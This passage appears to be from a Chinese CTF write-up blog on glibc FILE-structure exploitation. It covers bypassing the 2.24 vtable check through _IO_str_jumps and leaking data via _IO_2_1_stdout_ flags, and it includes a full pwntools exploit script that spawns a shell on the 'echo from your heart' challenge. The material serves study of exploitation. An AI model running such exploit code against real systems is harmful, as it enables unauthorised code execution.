title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h2><p>华北赛区的一道半决赛题</p><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>三个功能 add edit show<br>add只能使用一次，会将name 和 指针保存在堆中，且获取name的时候会有八个字节的溢出，刚好可以覆盖指针，<br>edit会先修改name ，再根据保存的指针来修改内存值，所以可以任意地址写<br>另：输入666可以得到puts的实际地址，因此可以泄露libc</p><h3 id="方向-2"><a href="#方向-2" class="headerlink" title="方向"></a>方向</h3><p>666 泄露libc，add或edit来修改指针，原计划修改malloc_hook为onegadget，但是鉴于在add之后不再有malloc 或者free，因此不可行。<br>很自然的想到修改IO_file 虚表来使程序退出时能够触发来getshell。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-24-check-绕过"><a href="#2-24-check-绕过" class="headerlink" title="2.24 check 绕过"></a>2.24 check 绕过</h1><p>前面已经知道从2.24开始添加了对虚表的检查，使得没有办法任意地址伪造vtable。所以有了一些不用伪造虚表的利用办法</p><h2 id="IO-buf-base-amp-IO-buf-end"><a href="#IO-buf-base-amp-IO-buf-end" class="headerlink" title="_IO_buf_base &amp; _IO_buf_end"></a>_IO_buf_base &amp; _IO_buf_end</h2><p>再调用相关stdin的函数如——read , scanf等函数时，会对__IO_stdin 的 _IO_buf_base ,_IO_buf_end, _IO_read_ptr, _IO_read_base, _IO_read_end 进行初始化，因为底层调用的malloc，所以一般都会分配到堆里。</p><p>可以随便写个小程序测试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">char *ptr = malloc(0x20);</span><br><span class="line">int a;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">printf(&quot;%d&quot;,a);</span><br><span class="line">free(ptr);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>加上调试符号编译，scanf过后，可以看到堆中添加了一个大小为0x411的chunk，这个chunk就是开辟的缓冲区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602030 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1041, </span><br><span class="line">  fd = 0xa363534333231, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602440 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134081, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; p *(struct _IO_FILE_plus *) stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x602046 &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x602047 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x602440 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd7770 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd59a0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd2440 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如我们在使用scanf对栈中的临时变量赋值时，作为缓冲区，数据也会在这边被同步保存，因而如果能够控制_IO_buf_base指针，就能够实现任意地址写。</p><p>同理printf等也会开辟输出缓冲区，通过修改也能够做到任意地址读。</p><h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc不止有_IO_file_jumps这个虚表，还有_IO_str_jumps 与 _IO_wstr_jumps等虚表，一般前者更好利用<br>所以将伪造的结构体vtable指针指向这个虚表，再对其进行利用</p><p>_IO_str_jumps 定义于/libio/strops.c中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>一般可以利用_IO_str_finish 与 _IO_str_overflow，同时也是前者更方便利用，定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); # call qword ptr [fp+0E8h]</span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_str_finish需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_str_overflow (FILE *fp, int c)</span><br><span class="line">&#123;</span><br><span class="line">  int flush_only = c == EOF;</span><br><span class="line">  size_t pos;</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      return flush_only ? 0 : EOF;</span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */         // step 1</span><br><span class="line">return EOF;</span><br><span class="line">      else</span><br><span class="line">&#123;</span><br><span class="line">  char *new_buf;</span><br><span class="line">  char *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  size_t old_blen = _IO_blen (fp);</span><br><span class="line">  size_t new_size = 2 * old_blen + 100;</span><br><span class="line">  if (new_size &lt; old_blen)</span><br><span class="line">    return EOF;</span><br><span class="line">  new_buf = malloc (new_size);</span><br><span class="line">  if (new_buf == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /*  __ferror(fp) = 1; */</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  if (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">      free (old_buf);</span><br><span class="line">      /* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */</span><br><span class="line">      fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">  memset (new_buf + old_blen, &apos;\0&apos;, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, 1);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;</span><br><span class="line">  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>_IO_str_overflow需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = 0</span><br><span class="line">_IO_write_base = 0</span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1</span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr -100) / 2 </span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure></p><h1 id="利用实例2"><a href="#利用实例2" class="headerlink" title="利用实例2"></a>利用实例2</h1><h2 id="echo-from-your-heart"><a href="#echo-from-your-heart" class="headerlink" title="echo from your heart"></a>echo from your heart</h2><h2 id="方向-3"><a href="#方向-3" class="headerlink" title="方向"></a>方向</h2><p>有点迷/尝试使用的fake_file2也没有成功，在unlink的时候就中断了。</p><p>_flags = 0<br>_IO_write_base &lt; _IO_write_ptr<br>_IO_buf_base = binsh<br>_mode &lt;= 0<br>vtable = _IO_str_jumps - 8<br>fp+0xe8 -&gt; system_addr</p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>基本上就是那个hctf中的printf，程序执行流基本一致</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">libc = ELF(&apos;/glibc/glibc-2.24/debug_x64/lib/libc-2.24.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(size,word):</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,str(size))</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,word)</span><br><span class="line"></span><br><span class="line">get(0x20,&quot;%lx.&quot;*8+&quot;%lx&quot;)</span><br><span class="line">sh.recvuntil(&apos;echo: &apos;)</span><br><span class="line">for i in range(8):</span><br><span class="line">    sh.recvuntil(&apos;.&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">libc.base = int(&apos;0x&apos;+sh.recvuntil(&apos;\n&apos;,drop=True),16) - 0x1fcc9</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line">io_str_jumps = libc.base + libc.symbols[&apos;_IO_str_jumps&apos;]</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh))</span><br><span class="line">#sh.recv()</span><br><span class="line">get(0x20,&apos;a&apos;*0x20+p64(0)+p64(0xfa1))</span><br><span class="line">get(0x1000,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">fake_file = p64(0)+p64(0x61)</span><br><span class="line">fake_file += p64(0)+p64(io_list_all-0x10)  # read_end &amp; read_base</span><br><span class="line">fake_file += p64(2)+p64(3)                 # write_base &lt; write_ptr</span><br><span class="line">fake_file += p64(0)+p64(binsh)             # write_end &amp; buf_base</span><br><span class="line">fake_file += &apos;\0&apos;*0x98#fake_file.ljust(0xd8,&apos;\0&apos;)  # use ljust will be detected why?</span><br><span class="line"></span><br><span class="line">pay = fake_file </span><br><span class="line">pay += p64(io_str_jumps-8)                 # vtable_ptr</span><br><span class="line">pay += p64(0) + p64(system)</span><br><span class="line"></span><br><span class="line">fake_file2 = p64(0)+p64(0x61)</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64(0)+p64((binsh-100)/2+1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64((binsh-100)/2)           # buf_end</span><br><span class="line">fake_file2 += &apos;\0&apos;*0x60</span><br><span class="line">fake_file2 += p64(2)+p64(3)                # freeres_list &amp; freeres_buf</span><br><span class="line">fake_file2 += p64(0)*0x20</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay2 = fake_file2</span><br><span class="line">pay2 += p64(io_str_jumps-0x18)</span><br><span class="line"></span><br><span class="line">get(0x10,&apos;d&apos; * 0x10 + pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#get(0x20,&apos;a&apos;*0x20+fake_file)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendlineafter(&apos;word: &apos;,&apos;20&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="利用实例3"><a href="#利用实例3" class="headerlink" title="利用实例3"></a>利用实例3</h1><p>利用 _IO_2_1_stdout_ 泄露信息</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>_flags 标志了FILE的一些行为，对其进行构造可以帮助我们进行泄露</p><p>其中高两位字节是_IO_magic<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br></pre></td></tr></table></figure></p><p>而低二位字节为比特级的标志位，低位到高位规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don&apos;t delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&apos;t call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure><p>因为前面已经分析了源码，这里就不细节分析了，提取相关的需要绕过部分讲解即可。因为是要利用_IO_2_1_stdout_来泄露，所以要修改的也是这个函数。</p><p>stdout    的_flags一般是：0x00000000fbad2887，根据标志位对应可以看到是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF</span><br></pre></td></tr></table></figure></p><p>输出时初始调用_IO_new_file_xsputn函数，该函数调用_IO_new_file_overflow，在这个函数里</p><ol><li><p>先检查是否有_IO_NO_WRITE标志位，没有的话直接报错退出，所以该位需要为0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    return EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>在这里又判断了_IO_CURRENTLY_PUTTING标志位，目的是查看是否需要分配缓冲区，因为一般分配过缓冲区的话该位就是1，所以一般设置为1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Allocate a buffer if needed. */</span><br><span class="line">     if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>然后在即将调用_IO_do_write函数时</p><ol start="3"><li>检查了_IO_UNBUFFERED标志位与_IO_LINE_BUF标志位，不过是或，即二者有一个就可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">    if (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></table></figure></li></ol><p>跟进到new_do_write函数后</p><ol start="4"><li>检查了_IO_IS_APPENDING标志位或fp-&gt;_IO_read_end != fp-&gt;_IO_write_base<br>所以令_IO_IS_APPENDING为1或_IO_read_end==_IO_write_base即可，否则的话就没有输出</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    /* On a system without a proper O_APPEND implementation,</span><br><span class="line">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">       Instead, just indicate that offset 